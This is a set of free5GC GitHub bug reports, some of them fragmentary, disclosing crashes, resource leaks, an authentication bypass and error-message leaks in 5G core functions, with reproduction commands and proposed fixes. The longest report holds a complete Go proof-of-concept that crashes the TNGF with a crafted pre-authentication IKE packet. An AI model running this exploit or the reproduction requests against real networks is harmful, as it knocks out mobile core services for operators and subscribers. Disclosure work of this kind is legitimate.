TNGF must enforce Message-Authenticator when EAP-Message is present, per RFC 3579 Section 3.1:

```go
// After attribute parsing loop, before any processing:
if eapMessage != nil && requestMessageAuthenticator == nil {
    radiusLog.Error("Access-Request with EAP-Message but no Message-Authenticator — dropping (RFC 3579)")
    return
}
```

## Environment

- free5GC Version: `v4.2.1`
- OS: `Ubuntu 24.04.2 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.26.1 linux/amd64`
- Docker image: `free5gc/tngf:v4.2.1`

## Log File
**Step 1** — Access-Request with EAP-Response/Identity, NO Message-Authenticator:
```
[INFO][TNGF][Radius] Handle Radius Access Request
[INFO][TNGF][Radius] Handle EAP-Res/Identity
[INFO][TNGF][Radius] Send Radius message to UE
[INFO][TNGF][Radius] Encoding...
```
TNGF accepted the request and responded with Access-Challenge containing EAP-5G-Start.

**Step 2** — Access-Request with EAP-5G NAS (Registration Request), NO Message-Authenticator:
```
[INFO][TNGF][Radius] Handle Radius Access Request
[INFO][TNGF][Radius] Handle EAP-Res/5G-NAS
[INFO][TNGF][Radius] Selected AMF Name: AMF
[INFO][TNGF][NGAP] [TNGF] Send Initial UE Message
[INFO][TNGF][NGAP] [TNGF] Handle Downlink NAS Transport
[INFO][TNGF][Radius] Send Radius message to UE
[INFO][TNGF][Radius] Encoding...
```

TNGF forwarded the NAS PDU to AMF via NGAP `Initial UE Message`. AMF processed it and responded with `Downlink NAS Transport` (containing Authentication Request). The full EAP-5G authentication flow was initiated without any RADIUS authentication.

items.title: [Bugs] NF Discovery Logic Flaw: buildFilter Appends Nil to $and Causing MongoDB Query Failure
items.body: ## Bug Description A logic flaw exists in the buildFilter function, used by the NFDiscoveryProcedure in processor/processor.go. When certain query parameters (e.g., tai) are provided — but do not match any of the expected target-nf-type values for which processing logic exists — the function appends a nil value to the $and clause of the MongoDB query filter. This leads to the following problems: 1. The database query contains an unexpected nil element in the $and array. 2. The MongoDB driver throws an error due to the malformed query. 3. The application's error handler insecurely includes the raw database error message in the JSON response that is returned to the client. This flaw not only causes service disruption (query failure) but also results in information disclosure by leaking raw backend error messages — potentially revealing internal database structure, query syntax, and driver details. ## To Reproduce execute: curl -X GET -i "http://10.100.200.18:8000/nnrf-disc/v1/nf-instances?target-nf-type=UDR&requester-nf-type=AMF&tai=%7B%22plmnId%22%3A%7B%22mcc%22%3A%22123%22%2C%22mnc%22%3A%2245%22%7D%2C%22tac%22%3A%221%22%7D" ## Expected Behavior ## Screenshots ## Environment free5GC Version: [v4.0.1] OS: [Ubuntu 20.04 Server] Kernel version: [Linux ubuntu-desktop 5.15.0-139-generic] go version: [go version go1.21.8 linux/amd64] C compiler version (optional): [gcc 9.4.0] ## Trace Files ### Configuration Files [config.zip](https://github.com/user-attachments/files/24446255/config.zip) ### PCAP File [free5gc.pcap.zip](https://github.com/user-attachments/files/24446246/free5gc.pcap.zip) ### Log File curl -X GET -i "http://10.100.200.18:8000/nnrf-disc/v1/nf-instances?target-nf-type=UDR&requester-nf-type=AMF&tai=%7B%22plmnId%22%3A%7B%22mcc%22%3A%22123%22%2C%22mnc%22%3A%2245%22%7D%2C%22tac%22%3A%221%22%7D" HTTP/1.1 500 Internal Server Error Content-Type: application/problem+json Date: Tue, 06 Jan 2026 06:46:19 GMT Content-Length: 155 {"title":"System failure","status":500,"detail":"RestfulAPIGetMany err: (BadValue) $or/$and/$nor entries need to be full objects","cause":"SYSTEM_FAILURE"}(base) nrf | 2026-01-06T06:44:53.308566224Z [INFO][NRF][DISC] Handle NFDiscoveryRequest nrf | 2026-01-06T06:44:53.309220922Z [ERRO][NRF][DISC] NFDiscoveryProcedure err: RestfulAPIGetMany err: (BadValue) $or/$and/$nor entries need to be full objects nrf | 2026-01-06T06:44:53.309378181Z [INFO][NRF][GIN] | 500 | 10.100.200.1 | GET | /nnrf-disc/v1/nf-instances?target-nf-type=UDR&requester-nf-type=AMF&tai=%7B%22plmnId%22%3A%7B%22mcc%22%3A%22123%22%2C%22mnc%22%3A%2245%22%7D%2C%22tac%22%3A%221%22%7D |

items.title: [Bugs] UDM incorrectly returns 500 for invalid UE ID containing control characters (%00) in Nudm_UECM GET request (net/url invalid control character)
items.body: ## Bug Decription The UDM component lacks comprehensive input validation/sanitization on the ueId path parameter in Nudm_UECM endpoints. When the ueId contains control characters (e.g., URL-encoded NUL bytes %00), the server decodes them and propagates the raw value into a downstream NUDR URL, causing URL parsing to fail with:net/url: invalid control character in URL Note: This issue is in the same category as #750 (missing input validation leading to 500), but it is triggered by invalid ueId control characters and fails during downstream NUDR URL construction/parsing, which is a different error pattern and code path than strconv.ParseInt failures. ## To Reproduce Steps to reproduce the behavior: 1. Start free5gC 2. Check for the IP and Port for UDM component 3. set oauth to false in nrfcfg.yaml for test convenience 4. Run the following command: curl -v "http://127.0.0.3:8000/nudm-uecm/v1/%00%00%00/registrations/amf-non-3gpp-access?supported-features=123" -H "Accept: application/json" 5. I get this result because i fuzz the http message, so i give all seeds to help you to confirm this issue: [dumuecmget.txt](https://github.com/user-attachments/files/24331427/dumuecmget.txt) ## Expected Behavior The UDM service should: Validate and sanitize the ueId path parameter before processing: Reject control characters (e.g., \x00), invalid percent-encoding, and unexpected formats. For any invalid parameter, return an appropriate 4xx client error (e.g., 400 Bad Request) with a clear and non-technical message. items.title: [Bugs] TNGF IKE encrypted payload ENCR_NULL decryption panics on invalid padding value, allowing pre-authentication remote DoS
items.body:
## Bug Description

A remote, unauthenticated attacker can kill the entire TNGF process by sending a single 48-byte crafted IKE_AUTH message after completing an IKE_SA_INIT exchange with `ENCR_NULL`. The `DecryptMessage()` function's `ENCR_NULL` code path in `security.go` reads the last byte of the **unencrypted** payload data as a padding length and uses it to slice the buffer without any bounds validation. When the last byte is >= the payload data length, the computed slice index becomes negative, causing an immediate **panic: slice bounds out of range**.

Because the TNGF IKE dispatcher's `recover()` handler calls `Fatalf` (which invokes `os.Exit(1)`), this panic **terminates the entire TNGF process**.

With `ENCR_NULL`, no encryption is applied to the IKE Encrypted payload: the inner bytes are what the peer sends, subject only to passing the negotiated integrity check (HMAC). The attacker **directly controls** those bytes after IKE_SA_INIT. The minimum exploit packet is **48 bytes** — a 4-byte inner payload plus HMAC is sufficient.

**No SIM card or authentication is required.** The attacker only needs to complete IKE_SA_INIT (one UDP round-trip), then send one crafted packet.

**Crash site**:

`NFs/tngf/pkg/ike/handler/security.go` lines 293-294:
```go
func DecryptMessage(key []byte, cipherText []byte, algorithmType uint16) ([]byte, error) {
    // ...
    case message.ENCR_NULL:
        length := len(key)
        if length != 0 {
            ikeLog.Warnf("Key size for the null cipher is not zero: %d.", length)
        }

        padding := int(cipherText[len(cipherText)-1]) + 1   // line 293: attacker directly controls cipherText
        plainText := cipherText[:len(cipherText)-padding]    // line 294: PANIC when padding > len(cipherText)

        return plainText, nil
```

**Data flow**:

```
Attacker ──IKE_SA_INIT(ENCR_NULL)──▶ TNGF   (TNGF accepts ENCR_NULL ✅, DH exchange, derive SK_ai)
Attacker ──IKE_AUTH(48 bytes)──▶ TNGF

handler.go:439    DecryptProcedure(ikeSecurityAssociation, message, encryptedPayload)
  └─ security.go:592  SK_ei check: len==0 && ENCR_NULL → OK (skip)
  └─ security.go:617  VerifyIKEChecksum(SK_ai)          ← passes (attacker has SK_ai)
  └─ security.go:631  DecryptMessage(SK_ei=[], data=[41 41 41 FF], ENCR_NULL)
       └─ security.go:293  padding = int(0xFF) + 1 = 256
       └─ security.go:294  cipherText[:4-256] = cipherText[:-252]  ← PANIC
```

**Why TNGF accepts ENCR_NULL**: The `is_supported()` function at `handler.go:1399-1400` explicitly returns `true` for `ENCR_NULL`:

```go
case ike_message.ENCR_NULL:
    return true
```

And `getKeyLength()` at `security.go:772-773` returns `(0, true)`, allowing IKE SA key derivation to proceed with a zero-length encryption key.

## To Reproduce

**Prerequisites**: free5GC v4.2.1 with TNGF deployed in Docker.

1. Build the PoC tool (requires Go 1.22+). The PoC:
   - Sends IKE_SA_INIT proposing `ENCR_NULL + AUTH_HMAC_SHA1_96 + PRF_HMAC_SHA1 + DH_2048`
   - TNGF accepts `ENCR_NULL` (confirmed: `Chosen: ENCR=11`)
   - Manually derives IKE SA keys using HMAC-SHA1 PRF (SK_ei is empty, SK_ai is 20 bytes)
   - Builds a 48-byte IKE_AUTH message: 28-byte IKE header + 4-byte SK payload header + 4-byte payload (`41 41 41 FF`) + 12-byte HMAC
   - The payload's last byte `0xFF` → `padding = 256` → negative slice → crash

```go
package main

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha1"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"hash"
	"io"
	"math/big"
	"net"
	"os"
	"time"

	ike_message "github.com/free5gc/ike/message"
	ike_security "github.com/free5gc/ike/security"
	"github.com/free5gc/ike/security/dh"
)

// PrfPlus implements RFC 7296 PRF+ key expansion
func prfPlus(prfKey []byte, seed []byte, totalLen int) []byte {
	var stream, prevBlock []byte
	for i := 1; len(stream) < totalLen; i++ {
		mac := hmac.New(sha1.New, prfKey)
		mac.Write(prevBlock)
		mac.Write(seed)
		mac.Write([]byte{byte(i)})
		prevBlock = mac.Sum(nil)
		stream = append(stream, prevBlock...)
	}
	return stream[:totalLen]
}

func runEncrNullPoC() {
	target := "10.100.200.1:500"
	if len(os.Args) > 2 {
		target = os.Args[2]
	}

	fmt.Printf("[*] PoC: TNGF ENCR_NULL Padding Overflow Crash\n")
	fmt.Printf("[*] Target: %s (TNGF)\n\n", target)

	// ============================================================
	// Step 1: Generate DH-2048 key pair
	// ============================================================
	fmt.Println("[1] Generating DH-2048 key pair...")

	dhType := dh.StrToType(dh.DH_2048_BIT_MODP)
	dhSecret, err := ike_security.GenerateRandomNumber()
	if err != nil {
		fmt.Printf("[-] DH secret failed: %v\n", err)
		os.Exit(1)
	}
	localPublicValue := dhType.GetPublicValue(dhSecret)

	spiBytes := make([]byte, 8)
	io.ReadFull(rand.Reader, spiBytes)
	initiatorSPI := binary.BigEndian.Uint64(spiBytes)
	localNonce := make([]byte, 32)
	io.ReadFull(rand.Reader, localNonce)

	// ============================================================
	// Step 2: Send IKE_SA_INIT proposing ENCR_NULL
	// ============================================================
	fmt.Println("\n[2] Sending IKE_SA_INIT with ENCR_NULL proposal...")
	fmt.Printf("    Initiator SPI: 0x%016x\n", initiatorSPI)

	conn, err := net.Dial("udp", target)
	if err != nil {
		fmt.Printf("[-] Connect failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	ikeInitMsg := buildEncrNullSAInit(initiatorSPI, localPublicValue, localNonce)
	initBytes, err := ikeInitMsg.Encode()
	if err != nil {
		fmt.Printf("[-] Encode failed: %v\n", err)
		os.Exit(1)
	}

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	conn.Write(initBytes)
	fmt.Printf("    Sent %d bytes\n", len(initBytes))

	buf := make([]byte, 65535)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Printf("[-] No response: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("    Received %d bytes\n", n)

	respMsg := new(ike_message.IKEMessage)
	if err := respMsg.Decode(buf[:n]); err != nil {
		fmt.Printf("[-] Decode failed: %v\n", err)
		os.Exit(1)
	}

	responderSPI := respMsg.ResponderSPI
	fmt.Printf("    Responder SPI: 0x%016x\n", responderSPI)

	var respSA *ike_message.SecurityAssociation
	var respKE *ike_message.KeyExchange
	var respNonce *ike_message.Nonce

	for _, p := range respMsg.Payloads {
		switch p.Type() {
		case ike_message.TypeSA:
			respSA = p.(*ike_message.SecurityAssociation)
		case ike_message.TypeKE:
			respKE = p.(*ike_message.KeyExchange)
		case ike_message.TypeNiNr:
			respNonce = p.(*ike_message.Nonce)
		}
	}

	if respSA == nil || respKE == nil || respNonce == nil {
		fmt.Println("[-] Missing SA/KE/Nonce in response")
		os.Exit(1)
	}

	// Verify ENCR_NULL was accepted
	chosenEncr := respSA.Proposals[0].EncryptionAlgorithm[0].TransformID
	chosenInteg := respSA.Proposals[0].IntegrityAlgorithm[0].TransformID
	chosenPRF := respSA.Proposals[0].PseudorandomFunction[0].TransformID
	chosenDH := respSA.Proposals[0].DiffieHellmanGroup[0].TransformID

	fmt.Printf("    Chosen: ENCR=%d INTEG=%d PRF=%d DH=%d\n",
		chosenEncr, chosenInteg, chosenPRF, chosenDH)

	if chosenEncr != ike_message.ENCR_NULL {
		fmt.Printf("[-] Server did not accept ENCR_NULL (got ENCR=%d)\n", chosenEncr)
		os.Exit(1)
	}
	fmt.Println("    [+] TNGF accepted ENCR_NULL for IKE SA!")

	// ============================================================
	// Step 3: Manually derive IKE SA keys
	// ============================================================
	fmt.Println("\n[3] Manually deriving IKE SA keys (ENCR_NULL + PRF_HMAC_SHA1)...")

	// Compute DH shared key
	peerPub := new(big.Int).SetBytes(respKE.KeyExchangeData)
	sharedKey := dhType.GetSharedKey(dhSecret, peerPub)
	fmt.Printf("    DH shared key: %d bytes\n", len(sharedKey))

	// Concatenated nonce
	concatenatedNonce := append(localNonce, respNonce.NonceData...)

	// SKEYSEED = PRF(Ni || Nr, g^ir)
	prfSkeyseed := hmac.New(sha1.New, concatenatedNonce)
	prfSkeyseed.Write(sharedKey)
	skeyseed := prfSkeyseed.Sum(nil)
	fmt.Printf("    SKEYSEED: %s\n", hex.EncodeToString(skeyseed))

	// Key lengths for PRF_HMAC_SHA1 + AUTH_HMAC_SHA1_96 + ENCR_NULL:
	// SK_d  = 20 (PRF key length)
	// SK_ai = 20 (HMAC-SHA1-96 key length)
	// SK_ar = 20
	// SK_ei = 0  (ENCR_NULL)
	// SK_er = 0  (ENCR_NULL)
	// SK_pi = 20
	// SK_pr = 20
	// Total = 100
	totalKeyLen := 20 + 20 + 20 + 0 + 0 + 20 + 20 // = 100

	// Seed = Ni || Nr || SPIi || SPIr
	seed := make([]byte, 0, len(concatenatedNonce)+16)
	seed = append(seed, concatenatedNonce...)
	spiI := make([]byte, 8)
	binary.BigEndian.PutUint64(spiI, initiatorSPI)
	seed = append(seed, spiI...)
	spiR := make([]byte, 8)
	binary.BigEndian.PutUint64(spiR, responderSPI)
	seed = append(seed, spiR...)

	keyStream := prfPlus(skeyseed, seed, totalKeyLen)

	skD := keyStream[0:20]
	skAi := keyStream[20:40]
	skAr := keyStream[40:60]
	// SK_ei = empty (0 bytes), SK_er = empty (0 bytes)
	skPi := keyStream[60:80]
	skPr := keyStream[80:100]

	_ = skD
	_ = skAr
	_ = skPi
	_ = skPr

	fmt.Printf("    SK_ai (20 bytes): %s\n", hex.EncodeToString(skAi))
	fmt.Printf("    SK_ei: (empty — ENCR_NULL)\n")
	fmt.Println("    [+] Keys derived successfully")

	// ============================================================
	// Step 4: Craft ENCR_NULL payload with overflow padding
	// ============================================================
	fmt.Println("\n[4] Crafting ENCR_NULL payload with padding overflow...")
	fmt.Println("    With ENCR_NULL, attacker DIRECTLY controls cipherText bytes")
	fmt.Println("    Last byte = 0xFF → padding = 256 → cipherText[:N-256] → PANIC")

	// For ENCR_NULL, the "encrypted" data IS the plaintext.
	// We need: some payload bytes + last byte = 0xFF
	// The DecryptMessage ENCR_NULL path:
	//   padding := int(cipherText[len(cipherText)-1]) + 1
	//   plainText := cipherText[:len(cipherText)-padding]
	//
	// We send 4 bytes: 3 random + 0xFF
	// padding = 256, len = 4 → cipherText[:4-256] = cipherText[:-252] → PANIC
	payloadData := []byte{0x41, 0x41, 0x41, 0xFF}
	fmt.Printf("    Payload data: %s (last byte=0xFF)\n", hex.EncodeToString(payloadData))

	// ============================================================
	// Step 5: Build IKE_AUTH with valid HMAC
	// ============================================================
	fmt.Println("\n[5] Building IKE_AUTH message with valid HMAC...")

	// Checksum length for AUTH_HMAC_SHA1_96 = 12 bytes
	checksumLen := 12

	// SK payload data = payload_data + placeholder_checksum
	skPayloadData := append(payloadData, make([]byte, checksumLen)...)

	// IKE Header
	ikeHeader := make([]byte, 28)
	binary.BigEndian.PutUint64(ikeHeader[0:8], initiatorSPI)
	binary.BigEndian.PutUint64(ikeHeader[8:16], responderSPI)
	ikeHeader[16] = byte(ike_message.TypeSK)
	ikeHeader[17] = 0x20
	ikeHeader[18] = ike_message.IKE_AUTH
	ikeHeader[19] = 0x08
	binary.BigEndian.PutUint32(ikeHeader[20:24], 1)

	// SK Payload Header
	skPayloadHeader := make([]byte, 4)
	skPayloadHeader[0] = 0
	skPayloadHeader[1] = 0
	skPayloadLen := uint16(4 + len(skPayloadData))
	binary.BigEndian.PutUint16(skPayloadHeader[2:4], skPayloadLen)

	totalLen := uint32(28 + 4 + len(skPayloadData))
	binary.BigEndian.PutUint32(ikeHeader[24:28], totalLen)

	fullMsg := make([]byte, 0, totalLen)
	fullMsg = append(fullMsg, ikeHeader...)
	fullMsg = append(fullMsg, skPayloadHeader...)
	fullMsg = append(fullMsg, skPayloadData...)

	// HMAC-SHA1-96 over message (without checksum)
	dataToSign := fullMsg[:len(fullMsg)-checksumLen]
	var mac hash.Hash = hmac.New(sha1.New, skAi)
	mac.Write(dataToSign)
	computedHMAC := mac.Sum(nil)[:checksumLen]
	copy(fullMsg[len(fullMsg)-checksumLen:], computedHMAC)

	fmt.Printf("    Message: %d bytes, HMAC: %s\n", len(fullMsg), hex.EncodeToString(computedHMAC))

	// ============================================================
	// Step 6: Send exploit
	// ============================================================
	fmt.Printf("\n[6] Sending ENCR_NULL exploit to TNGF...\n")

	// Check alive first using SHA1 probe
	fmt.Printf("    Pre-check: TNGF alive = %v\n", checkAliveSHA1(target))

	conn2, err := net.Dial("udp", target)
	if err != nil {
		fmt.Printf("[-] Connect failed: %v\n", err)
		os.Exit(1)
	}
	defer conn2.Close()

	conn2.SetWriteDeadline(time.Now().Add(5 * time.Second))
	conn2.Write(fullMsg)
	fmt.Printf("    Exploit sent (%d bytes)\n", len(fullMsg))
	fmt.Println("    Waiting 3 seconds...")
	time.Sleep(3 * time.Second)

	// ============================================================
	// Step 7: Check crash
	// ============================================================
	fmt.Printf("\n[7] Post-check: TNGF alive = %v\n", checkAliveSHA1(target))
	fmt.Println("\n[*] Check logs:")
	fmt.Println("    docker logs tngf 2>&1 | tail -30")
	fmt.Println("    docker logs tngf 2>&1 | grep -A5 'panic\\|slice bounds'")
}

func buildEncrNullSAInit(initiatorSPI uint64, keData, nonceData []byte) *ike_message.IKEMessage {
	ikePayload := new(ike_message.IKEPayloadContainer)

	sa := ikePayload.BuildSecurityAssociation()
	proposal := sa.Proposals.BuildProposal(1, ike_message.TypeIKE, nil)

	// ENCR_NULL (no key length attribute)
	proposal.EncryptionAlgorithm = append(proposal.EncryptionAlgorithm,
		&ike_message.Transform{
			TransformType:    ike_message.TypeEncryptionAlgorithm,
			TransformID:      ike_message.ENCR_NULL,
			AttributePresent: false,
		})

	proposal.IntegrityAlgorithm = append(proposal.IntegrityAlgorithm,
		&ike_message.Transform{
			TransformType: ike_message.TypeIntegrityAlgorithm,
			TransformID:   ike_message.AUTH_HMAC_SHA1_96,
		})

	proposal.PseudorandomFunction = append(proposal.PseudorandomFunction,
		&ike_message.Transform{
			TransformType: ike_message.TypePseudorandomFunction,
			TransformID:   ike_message.PRF_HMAC_SHA1,
		})

	proposal.DiffieHellmanGroup = append(proposal.DiffieHellmanGroup,
		&ike_message.Transform{
			TransformType: ike_message.TypeDiffieHellmanGroup,
			TransformID:   ike_message.DH_2048_BIT_MODP,
		})

	ikePayload.BuildKeyExchange(ike_message.DH_2048_BIT_MODP, keData)
	ikePayload.BuildNonce(nonceData)

	return ike_message.NewMessage(initiatorSPI, 0,
		ike_message.IKE_SA_INIT, false, false, 0, *ikePayload)
}

func checkAliveSHA1(target string) bool {
	conn, err := net.DialTimeout("udp", target, 2*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	dhType := dh.StrToType(dh.DH_2048_BIT_MODP)
	secret, _ := ike_security.GenerateRandomNumber()
	pubVal := dhType.GetPublicValue(secret)
	nonce := make([]byte, 32)
	rand.Read(nonce)

	// Use SHA1 algorithms for TNGF probe
	probe := buildIKESAInitWithAlgo(0x4242424242424242, pubVal, nonce, true)
	data, _ := probe.Encode()

	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	conn.Write(data)

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 4096)
	n, readErr := conn.Read(buf)
	return readErr == nil && n > 0
}
```


3. PoC output:

```
[*] PoC: TNGF ENCR_NULL Padding Overflow Crash
[*] Target: 10.100.200.1:500 (TNGF)

[1] Generating DH-2048 key pair...

[2] Sending IKE_SA_INIT with ENCR_NULL proposal...
    Initiator SPI: 0x631ea39e285cdb8e
    Sent 372 bytes

    Chosen: ENCR=11 INTEG=2 PRF=2 DH=14

[3] Manually deriving IKE SA keys (ENCR_NULL + PRF_HMAC_SHA1)...
    SKEYSEED: 82311370b789ac4dfc071e0088b7f611abd7c9e5
    SK_ai (20 bytes): 3b6d66e2d0728d457db9ac0dba967fc74ccb8f8b
    SK_ei: (empty — ENCR_NULL)

[4] Crafting ENCR_NULL payload with padding overflow...

[5] Building IKE_AUTH message with valid HMAC...

```

4. Verify crash in container logs:

```bash

```

## Expected Behavior

The `DecryptMessage()` ENCR_NULL branch should validate that the padding value does not exceed the data length, and also handle the empty ciphertext case:

```go
case message.ENCR_NULL:
    length := len(key)
    if length != 0 {
        ikeLog.Warnf("Key size for the null cipher is not zero: %d.", length)
    }
    if len(cipherText) == 0 {
        return nil, errors.New("empty ciphertext")
    }
    padding := int(cipherText[len(cipherText)-1]) + 1
    if padding > len(cipherText) {
        return nil, errors.New("invalid padding value exceeds ciphertext length")
    }
    plainText := cipherText[:len(cipherText)-padding]
    return plainText, nil
```

```go
case ike_message.ENCR_NULL:
    return false  // ENCR_NULL must not be used for IKE SA
```

items.title: [Bugs] AMF Crash Due to Malformed SUCI Data Processing
[Bugs] Resource Leak in AMF when Unexpected InitialUEMessage Service Request Received
items.body:
## Describe the bug
The AMF experiences a resource leak after logging "No Security Context : SUPI[]" when receiving an InitialUEMessage Service Request at an unexpected timing.

## To Reproduce
If the following sequence occurs for the same 5G-S-TMSI, the AmfUe is not released, leading to a resource leak:

  1.   UE Context Release Request (NG-RAN node initiated) (gNB -> AMF)
  2.   UEContextReleaseCommand (AMF -> gNB)
  3.   InitialUEMessage Service Request (gNB -> AMF)
  3.1. AMF attaches new ranUe
  4.   UEContextReleaseComplete (gNB -> AMF)

## Expected behavior
AMF should release old resources and then switch to new resources:

  1.   UE Context Release Request (NG-RAN node initiated)(gNB -> AMF)
  2.   UEContextReleaseCommand(AMF -> gNB)
  3.   InitialUEMessage Service Request(gNB -> AMF)
  3.1 AMF should detach old ranUe
  3.2 AMF should attach new ranUe

## Walkthrough
The resource leak occurs when the else case in the HandleNAS function is executed. It seems that the leak happens because the old AmfUe is not released, and a new AmfUe ("") is used instead.

Note1.
  The evaluation result of this if statement is the behavior of evaluating if(true && false).
>         if ranUe.HoldingAmfUe != nil && !ranUe.HoldingAmfUe.CmConnect(ranUe.Ran.AnType) { 　
        
```
func HandleNAS(ranUe *amf_context.RanUe, procedureCode int64, nasPdu []byte, initialMessage bool) {
    ...
    if ranUe.AmfUe == nil {
        // Only the New created RanUE will have no AmfUe in it
        if ranUe.HoldingAmfUe != nil && !ranUe.HoldingAmfUe.CmConnect(ranUe.Ran.AnType) { 　
            // If the UE is CM-IDLE, there is no RanUE in AmfUe, so here we attach new RanUe to AmfUe.
            gmm_common.AttachRanUeToAmfUeAndReleaseOldIfAny(ranUe.HoldingAmfUe, ranUe)
            ranUe.HoldingAmfUe = nil
        } else { //
            // Assume we have an existing UE context in CM-CONNECTED state. (RanUe <-> AmfUe)
            // We will release it if the new UE context has a valid security context(Authenticated) in line 50.
            ranUe.AmfUe = amfSelf.NewAmfUe(“”)
            gmm_common.AttachRanUeToAmfUeAndReleaseOldIfAny(ranUe.AmfUe, ranUe)
        }
    }
    ...
}
```

Note2.
If you pass NewAmfUe("") as the first argument to the AttachRanUeToAmfUeAndReleaseOldIfAny function,
the evaluation result of if will be false, which may result in a resource leak.

```
func AttachRanUeToAmfUeAndReleaseOldIfAny(amfUe *context.AmfUe, ranUe *context.RanUe) {
  if oldRanUe := amfUe.RanUe[ranUe.Ran.AnType]; oldRanUe != nil {
    oldRanUe.Log.Infof("Implicit Deregistration - RanUeNgapID[%d]", oldRanUe.RanUeNgapId)
    oldRanUe.DetachAmfUe()
    if amfUe.T3550 != nil {
      amfUe.State[ranUe.Ran.AnType].Set(context.Registered)
    }
    StopAll5GSMMTimers(amfUe)
    causeGroup := ngapType.CausePresentRadioNetwork
    causeValue := ngapType.CauseRadioNetworkPresentReleaseDueToNgranGeneratedReason
    ngap_message.SendUEContextReleaseCommand(oldRanUe, context.UeContextReleaseUeContext, causeGroup, causeValue)
  }
  amfUe.AttachRanUe(ranUe)
}
```

## Bug fix
If changing the arguments is acceptable, the following fix is ​​suggested:
```
func AttachRanUeToAmfUeAndReleaseOldIfAny(ranUe *context.RanUe) {

  if ranUe.amfUe != nil && oldRanUe := ranUe.amfUe.RanUe[ranUe.Ran.AnType]; oldRanUe != nil {
    amfUe := ranUe.amfUe
   
    oldRanUe.Log.Infof("Implicit Deregistration - RanUeNgapID[%d]", oldRanUe.RanUeNgapId)
    oldRanUe.DetachAmfUe()
    if amfUe.T3550 != nil {
      amfUe.State[ranUe.Ran.AnType].Set(context.Registered)
    }
    StopAll5GSMMTimers(amfUe)
    causeGroup := ngapType.CausePresentRadioNetwork
    causeValue := ngapType.CauseRadioNetworkPresentReleaseDueToNgranGeneratedReason
    ngap_message.SendUEContextReleaseCommand(oldRanUe, context.UeContextReleaseUeContext, causeGroup, causeValue)
   
  }
 
  ranUe.amfUe = amfSelf.NewAmfUe("")
  ranUe.amfUe.AttachRanUe(ranUe)
}
```

## Additional Context
This issue may be related to the changes introduced in the following fix: https://github.com/free5gc/free5gc/issues/580


## Environment
free5GC Version: v3.4.3
OS: Ubuntu 20.04.6 LTS
Kernel Version: 5.4.0-125-generic
Go Version: Ubuntu go1.21.8 linux/amd64

items.title: [Bugs] UPF leaks PfcpXact if PFCP Session Report Response is not processed
items.body:
## Describe the bug
UPF leaks PfcpXact if PFCP Session Report Response is not processed.

An allocated PfcpXact about PFCP Session Report procedure is freed only when received the `UPF_EVENT_N4_MESSAGE` event about `PFCP_SESSION_REPORT_RESPONSE` message by the event consumer thread.

Therefore the PfcpXact will be leaked if such `UPF_EVENT_N4_MESSAGE` event is not received by the event consumer thread for whatever reasons. This will eventually empty `pfcpXactPool` and prevent to create a new PFCP transaction anymore.

## To Reproduce
Steps to reproduce the behavior:
1. Apply the following patch to prevent for SMF to respond PFCP Session Report Requests and to make `pfcpXactPool` empty
   ```patch
   --- a/test/registration_test.go
   +++ b/test/registration_test.go
   @@ -677,9 +677,17 @@ func TestServiceRequest(t *testing.T) {
           assert.Nil(t, err)

           // UE is CM-IDLE now
   -
   +       err = exec.Command("sudo", "iptables", "-A", "INPUT", "-i", "veth0", "-p", "udp", "--dport", "8805", "-j", "DROP").Run()
   +       assert.NoError(t, err)
   +       defer exec.Command("sudo", "iptables", "-D", "INPUT", "-i", "veth0", "-p", "udp", "--dport", "8805", "-j", "DROP").Run()
           time.Sleep(1 * time.Second)
   
   +       exec.Command("sudo", "ip", "netns", "exec", "UPFns", "ping", "-s", "0", "-c", "70", "-i", "0.1", "60.60.0.1").Run()
   +       err = exec.Command("sudo", "iptables", "-D", "INPUT", "-i", "veth0", "-p", "udp", "--dport", "8805", "-j", "DROP").Run()
   +       assert.NoError(t, err)
   +
   +       exec.Command("sudo", "ip", "netns", "exec", "UPFns", "ping", "-s", "0", "-c", "1", "60.60.0.1").Run()
   +
           // send NAS Service Request
           pdu = nasTestpacket.GetServiceRequest(nasMessage.ServiceTypeData)
   ```
2. Run `./test.sh -o TestServiceRequest`

You can see the following messages in logs/nf/upf.log:
```
time="2021-11-30T15:42:15+09:00" level=warning msg="Index Pool is empty" category=Util component=UPF
time="2021-11-30T15:42:15+09:00" level=error msg="Transaction allocation failed" category=Util component=UPF
time="2021-11-30T15:42:15+09:00" level=error msg="new Xact error" category=Util component=UPF
time="2021-11-30T15:42:15+09:00" level=error category=Util component=UPF
time="2021-11-30T15:42:18+09:00" level=warning msg="Index Pool is empty" category=Util component=UPF
time="2021-11-30T15:42:18+09:00" level=error msg="Transaction allocation failed" category=Util component=UPF
time="2021-11-30T15:42:18+09:00" level=error msg="new Xact error" category=Util component=UPF
time="2021-11-30T15:42:18+09:00" level=error category=Util component=UPF
time="2021-11-30T15:42:21+09:00" level=warning msg="Index Pool is empty" category=Util component=UPF
time="2021-11-30T15:42:21+09:00" level=error msg="Transaction allocation failed" category=Util component=UPF
time="2021-11-30T15:42:21+09:00" level=error msg="new Xact error" category=Util component=UPF
time="2021-11-30T15:42:21+09:00" level=error category=Util component=UPF
```
These mean that no new PfcpXact about PFCP Session Modification procedure triggered by Service Request procedure was allocated.

You can also see the following message just before upf was terminated.
```
time="2021-11-30T15:42:26+09:00" level=warning msg="64 not freed in pfcpXactPool[0] of PFCP Transaction" category=Util component=UPF
```
This shows that 64 PfcpXacts had been leaked.

## Expected behavior
Leaked PfcpXacts will be freed after specific timeouts respectively so that they will be able to be allocated to new PFCP procedures.

## Environment (please complete the following information):
 - free5GC Version: v3.0.6
 - OS: Ubuntu 18.04 LTS
 - Kernel version: 5.0.0-23-generic
 - go version: 1.14.4 linux/amd64
 - c compiler version (Option): gcc 7.5.0

items.title: [Bugs] An abend may result in a bufBlk leak or NULL access.
items.body:
## Describe the bug
There is a defect in handling Bufblk in PFCP message processing, causing segmentation fault due to NULL pointer access and memory leak due to insufficient post-processing on error.

## To Reproduce
